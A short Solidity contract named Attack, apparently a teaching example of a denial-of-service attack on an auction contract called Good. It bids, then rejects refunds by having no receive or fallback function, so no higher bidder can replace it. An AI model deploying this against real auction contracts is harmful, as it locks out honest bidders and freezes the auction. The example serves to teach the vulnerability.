//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./Good.sol";

contract Attack {
    Good good;

    constructor(address _good) {
        good = Good(_good);
    }

    /**
     * the key here is that Attack doesn't have a receive or fallback function.
     * So once Attack.sol has been the winner, when a bigger auction comes it will try to send to this contract the amount deposited before.
     * But it will fail and because of that it won't update the winner.
     */
    function attack() public payable {
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}
